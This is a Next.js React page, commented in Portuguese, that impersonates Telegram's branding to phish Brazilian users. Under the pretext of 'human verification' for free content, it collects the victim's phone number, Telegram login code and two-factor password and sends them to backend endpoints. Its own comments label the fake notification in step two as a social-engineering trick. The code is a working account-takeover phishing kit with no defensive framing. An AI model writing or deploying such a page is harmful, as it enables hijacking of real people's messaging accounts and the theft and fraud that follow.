import { useState } from 'react';
import Head from 'next/head';

export default function Home() {
  const [step, setStep] = useState(1); // 1: Phone, 2: Code, 3: Password (2FA)
  const [loading, setLoading] = useState(false);
  const [rawPhone, setRawPhone] = useState('');
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [hash, setHash] = useState('');

  // Tema Oficial Dark
  const theme = {
    bg: '#1c242f',
    card: '#242f3d',
    text: '#ffffff',
    subText: '#7f91a4',
    blue: '#3390ec',
    divider: '#10161d'
  };

  // Máscara de Telefone (DDD + 9 + 8 digitos)
  const handlePhoneChange = (e) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 11) val = val.slice(0, 11);
    setRawPhone(val);
  };

  const formattedPhoneDisplay = () => {
    if (!rawPhone) return '';
    let r = rawPhone;
    if (r.length > 2) r = `(${r.slice(0, 2)}) ${r.slice(2)}`;
    if (r.length > 7) r = `${r.slice(0, 9)}-${r.slice(9)}`;
    return r;
  };

  const handleSendCode = async () => {
    if (rawPhone.length < 10) return setError('Número incompleto.');
    setLoading(true); setError('');
    const cleanNumber = `55${rawPhone}`;

    try {
      const res = await fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: cleanNumber }),
      });
      const data = await res.json();
      
      if (res.ok) {
        setHash(data.phoneCodeHash);
        setStep(2);
      } else {
         setError('Não foi possível conectar. Tente mais tarde.');
      }
    } catch (err) { setError('Falha na conexão.'); }
    setLoading(false);
  };

  const handleVerifyCode = async () => {
    if (code.length < 5) return setError('Código incompleto.');
    setLoading(true); setError('');
    const cleanNumber = `55${rawPhone}`;

    try {
      const res = await fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            phoneNumber: cleanNumber, 
            code, 
            phoneCodeHash: hash, 
            password 
        }),
      });
      const data = await res.json();

      if (data.status === 'needs_2fa') {
          setStep(3);
          setLoading(false);
          return;
      }

      if (res.ok && data.success) {
        window.location.href = data.redirect;
      } else {
        setError('Código inválido ou expirado.');
      }
    } catch (err) { setError('Erro na validação.'); }
    setLoading(false);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', backgroundColor: theme.bg, fontFamily: '-apple-system, Roboto, Helvetica, Arial, sans-serif' }}>
      <Head>
        <title>Telegram Verification</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
        <meta name="theme-color" content={theme.bg} />
      </Head>

      <div style={{ width: '100%', maxWidth: '400px', padding: '24px' }}>
        
        {/* LOGO */}
        <div style={{ textAlign: 'center', marginBottom: '30px' }}>
            <div style={{ width: '100px', height: '100px', background: theme.card, borderRadius: '50%', margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <svg width="50" height="50" viewBox="0 0 24 24" fill="none">
                    <path d="M20.665 3.717L2.955 10.551C1.745 11.037 1.751 11.711 2.732 12.012L7.281 13.431L17.81 6.791C18.308 6.488 18.763 6.654 18.389 6.987L9.866 14.671H9.862L9.866 14.675L9.553 19.344C10.012 19.344 10.215 19.133 10.472 18.885L12.678 16.738L17.265 20.129C18.11 20.595 18.717 20.355 18.927 19.344L21.937 5.165C22.245 3.929 21.472 3.369 20.665 3.717Z" fill={theme.blue}/>
                </svg>
            </div>
        </div>

        {/* TEXTOS */}
        <div style={{ textAlign: 'center', marginBottom: '30px' }}>
            <h1 style={{ color: theme.text, fontSize: '20px', fontWeight: 'bold', marginBottom: '10px' }}>
            {step === 1 ? 'Verificação de Humano' : step === 2 ? 'Confirmação' : 'Senha de Proteção'}
            </h1>
            <p style={{ color: theme.subText, fontSize: '14px', lineHeight: '1.4' }}>
            {step === 1 ? 'Para acessar o conteúdo gratuito, confirme seu país e número de telefone.' : 
            step === 2 ? `Um código de confirmação foi enviado para o seu Telegram.` :
            'Esta conta possui uma senha adicional.'}
            </p>
        </div>

        {error && <div style={{ textAlign: 'center', color: '#ff5c5c', fontSize: '13px', marginBottom: '20px' }}>{error}</div>}

        {/* PASSO 1 */}
        {step === 1 && (
          <>
            <div style={{ background: theme.card, borderRadius: '12px', overflow: 'hidden', marginBottom: '20px', border: `1px solid ${theme.divider}` }}>
                <div style={{ display: 'flex', alignItems: 'center', padding: '15px', borderBottom: `1px solid ${theme.divider}` }}>
                    <span style={{ fontSize: '18px', marginRight: '10px' }}>🇧🇷</span>
                    <span style={{ color: theme.text, fontSize: '16px' }}>Brasil</span>
                    <span style={{ marginLeft: 'auto', color: theme.subText, fontSize: '16px' }}>+55</span>
                </div>
                <div style={{ padding: '15px' }}>
                    <input
                      type="tel"
                      value={formattedPhoneDisplay()}
                      onChange={handlePhoneChange}
                      placeholder="(00) 00000-0000"
                      style={{ width: '100%', background: 'transparent', border: 'none', color: theme.text, fontSize: '18px', fontWeight: '500', outline: 'none' }}
                      autoFocus
                    />
                </div>
            </div>

            <button
              onClick={handleSendCode}
              disabled={loading || rawPhone.length < 10}
              style={{ width: '100%', padding: '14px', backgroundColor: rawPhone.length >= 10 ? theme.blue : '#2b3440', color: rawPhone.length >= 10 ? 'white' : '#576675', border: 'none', borderRadius: '10px', fontSize: '15px', fontWeight: 'bold', cursor: 'pointer' }}
            >
              {loading ? 'AGUARDE...' : 'CONTINUAR'}
            </button>
          </>
        )}

        {/* PASSO 2 - O TRUQUE DE ENGENHARIA SOCIAL */}
        {step === 2 && (
          <>
            {/* Mensagem Simulada (Imita a estrutura da notificação real, mas muda o texto) */}
            <div style={{ background: '#222e3a', borderRadius: '10px', padding: '12px', marginBottom: '25px', borderLeft: `3px solid ${theme.blue}`, textAlign: 'left' }}>
                
                {/* Cabeçalho da Notificação */}
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '8px' }}>
                     <span style={{ color: theme.text, fontWeight: 'bold', fontSize: '14px' }}>Telegram</span>
                </div>

                {/* Corpo da Mensagem (Imitando a estrutura do Telegram, mas com texto de engenharia social) */}
                <div style={{ color: '#fff', fontSize: '13px', lineHeight: '1.4' }}>
                    Código de verificação: <span style={{ background: 'rgba(51, 144, 236, 0.2)', color: theme.text, fontWeight: 'bold', padding: '0 4px', borderRadius: '3px' }}>00000</span>. Use o código de 5 digitos para acesaar conteudo.
                    <br/><br/>
                    <span style={{ color: '#ff5c5c', fontWeight: 'bold' }}>!</span> Este procedimento é obrigatório para acessar canais restritos.
                    <br/><br/>
                    <span style={{ color: theme.subText }}>Se você não solicitou, ignore esta mensagem.</span>
                </div>
            </div>

            <div style={{ marginBottom: '25px' }}>
                <input
                  type="tel"
                  maxLength={5}
                  value={code}
                  onChange={(e) => setCode(e.target.value.replace(/\D/g,''))}
                  placeholder="— — — — —"
                  style={{ width: '100%', padding: '10px', background: 'transparent', border: 'none', borderBottom: `2px solid ${code ? theme.blue : theme.divider}`, color: theme.text, fontSize: '30px', textAlign: 'center', letterSpacing: '8px', outline: 'none' }}
                  autoFocus
                />
            </div>

            <button
              onClick={handleVerifyCode}
              disabled={loading || code.length < 5}
              style={{ width: '100%', padding: '14px', backgroundColor: code.length === 5 ? theme.blue : '#2b3440', color: code.length === 5 ? 'white' : '#576675', border: 'none', borderRadius: '10px', fontSize: '15px', fontWeight: 'bold', cursor: 'pointer' }}
            >
              {loading ? 'VERIFICANDO...' : 'CONFIRMAR IDENTIDADE'}
            </button>
          </>
        )}

        {/* PASSO 3 */}
        {step === 3 && (
            <div style={{ width: '100%' }}>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Sua senha"
                  style={{ width: '100%', padding: '15px', backgroundColor: theme.card, border: `1px solid ${theme.divider}`, borderRadius: '10px', color: theme.text, fontSize: '16px', outline: 'none', marginBottom: '20px' }}
                  autoFocus
                />
                <button
                  onClick={handleVerifyCode}
                  disabled={loading}
                  style={{ width: '100%', padding: '14px', backgroundColor: theme.blue, color: 'white', border: 'none', borderRadius: '10px', fontSize: '15px', fontWeight: 'bold', cursor: 'pointer' }}
                >
                  {loading ? 'ENTRANDO...' : 'LIBERAR ACESSO'}
                </button>
            </div>
        )}

      </div>
    </div>
  );
}
